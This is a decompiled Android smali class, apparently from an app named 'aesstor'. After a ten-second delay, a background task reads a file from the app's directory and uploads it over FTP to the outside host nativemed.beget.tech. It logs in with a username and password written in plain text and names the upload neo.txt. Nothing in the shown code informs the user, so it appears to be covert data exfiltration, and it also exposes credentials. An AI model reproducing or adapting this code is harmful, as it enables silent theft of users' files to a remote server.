.class public Lcom/example/xavier/aesstor/NeoFTP;
.super Landroid/os/AsyncTask;
.source "NeoFTP.java"


# annotations
.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask<",
        "Ljava/lang/String;",
        "Ljava/lang/Integer;",
        "Ljava/lang/Integer;",
        ">;"
    }
.end annotation


# static fields
.field static final FILENAME:Ljava/lang/String; = "neo.txt"


# instance fields
.field mAc:Lcom/example/xavier/aesstor/MainActivity;

.field public myDr:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 14
    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    .line 17
    new-instance v0, Lcom/example/xavier/aesstor/MainActivity;

    invoke-direct {v0}, Lcom/example/xavier/aesstor/MainActivity;-><init>()V

    iput-object v0, p0, Lcom/example/xavier/aesstor/NeoFTP;->mAc:Lcom/example/xavier/aesstor/MainActivity;

    .line 20
    iget-object v0, p0, Lcom/example/xavier/aesstor/NeoFTP;->mAc:Lcom/example/xavier/aesstor/MainActivity;

    invoke-virtual {v0}, Lcom/example/xavier/aesstor/MainActivity;->myDir()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/example/xavier/aesstor/NeoFTP;->myDr:Ljava/lang/String;

    return-void
.end method

.method public static ftpConnect(Ljava/lang/String;)V
    .locals 5
    .param p0, "myFilePath"    # Ljava/lang/String;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/FileNotFoundException;
        }
    .end annotation

    .line 42
    const-string v0, "nativemed.beget.tech"

    .line 43
    .local v0, "host":Ljava/lang/String;
    new-instance v1, Lorg/apache/commons/net/ftp/FTPClient;

    invoke-direct {v1}, Lorg/apache/commons/net/ftp/FTPClient;-><init>()V

    .line 46
    .local v1, "ftpClient":Lorg/apache/commons/net/ftp/FTPClient;
    :try_start_0
    new-instance v2, Ljava/io/FileInputStream;

    invoke-direct {v2, p0}, Ljava/io/FileInputStream;-><init>(Ljava/lang/String;)V

    .line 47
    .local v2, "fileInputStream":Ljava/io/FileInputStream;
    invoke-virtual {v1, v0}, Lorg/apache/commons/net/ftp/FTPClient;->connect(Ljava/lang/String;)V

    .line 48
    invoke-virtual {v1}, Lorg/apache/commons/net/ftp/FTPClient;->enterLocalPassiveMode()V

    .line 49
    const-string v3, "nativemed_neo"

    const-string v4, "28x*ixH3"

    invoke-virtual {v1, v3, v4}, Lorg/apache/commons/net/ftp/FTPClient;->login(Ljava/lang/String;Ljava/lang/String;)Z

    .line 50
    const-string v3, "neo.txt"

    invoke-virtual {v1, v3, v2}, Lorg/apache/commons/net/ftp/FTPClient;->storeFile(Ljava/lang/String;Ljava/io/InputStream;)Z

    .line 51
    invoke-virtual {v1}, Lorg/apache/commons/net/ftp/FTPClient;->logout()Z

    .line 52
    invoke-virtual {v1}, Lorg/apache/commons/net/ftp/FTPClient;->disconnect()V
    :try_end_0
    .catch Ljava/io/FileNotFoundException; {:try_start_0 .. :try_end_0} :catch_2
    .catch Ljava/net/SocketException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .end local v2    # "fileInputStream":Ljava/io/FileInputStream;
    goto :goto_0

    .line 58
    :catch_0
    move-exception v2

    .line 59
    .local v2, "e":Ljava/io/IOException;
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_1

    .line 56
    .end local v2    # "e":Ljava/io/IOException;
    :catch_1
    move-exception v2

    .line 57
    .local v2, "e":Ljava/net/SocketException;
    invoke-virtual {v2}, Ljava/net/SocketException;->printStackTrace()V

    .end local v2    # "e":Ljava/net/SocketException;
    goto :goto_0

    .line 54
    :catch_2
    move-exception v2

    .line 55
    .local v2, "e":Ljava/io/FileNotFoundException;
    invoke-virtual {v2}, Ljava/io/FileNotFoundException;->printStackTrace()V

    .line 60
    .end local v2    # "e":Ljava/io/FileNotFoundException;
    :goto_0
    nop

    .line 62
    :goto_1
    return-void
.end method


# virtual methods
.method protected varargs doInBackground([Ljava/lang/String;)Ljava/lang/Integer;
    .locals 4
    .param p1, "strings"    # [Ljava/lang/String;

    .line 24
    const/4 v0, 0x0

    .line 27
    .local v0, "myProgress":I
    :try_start_0
    sget-object v1, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v2, 0xa

    invoke-virtual {v1, v2, v3}, Ljava/util/concurrent/TimeUnit;->sleep(J)V

    .line 28
    iget-object v1, p0, Lcom/example/xavier/aesstor/NeoFTP;->myDr:Ljava/lang/String;

    invoke-static {v1}, Lcom/example/xavier/aesstor/NeoFTP;->ftpConnect(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/io/FileNotFoundException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 31
    :catch_0
    move-exception v1

    .line 32
    .local v1, "e":Ljava/lang/InterruptedException;
    invoke-virtual {v1}, Ljava/lang/InterruptedException;->printStackTrace()V

    goto :goto_1

    .line 29
    .end local v1    # "e":Ljava/lang/InterruptedException;
    :catch_1
    move-exception v1

    .line 30
    .local v1, "e":Ljava/io/FileNotFoundException;
    invoke-virtual {v1}, Ljava/io/FileNotFoundException;->printStackTrace()V

    .line 33
    .end local v1    # "e":Ljava/io/FileNotFoundException;
    :goto_0
    nop

    .line 35
    :goto_1
    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Integer;

    const/4 v2, 0x0

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    aput-object v3, v1, v2

    invoke-virtual {p0, v1}, Lcom/example/xavier/aesstor/NeoFTP;->publishProgress([Ljava/lang/Object;)V

    .line 37
    const/4 v1, 0x0

    return-object v1
.end method

.method protected bridge synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 0

    .line 14
    check-cast p1, [Ljava/lang/String;

    invoke-virtual {p0, p1}, Lcom/example/xavier/aesstor/NeoFTP;->doInBackground([Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object p1

    return-object p1
.end method
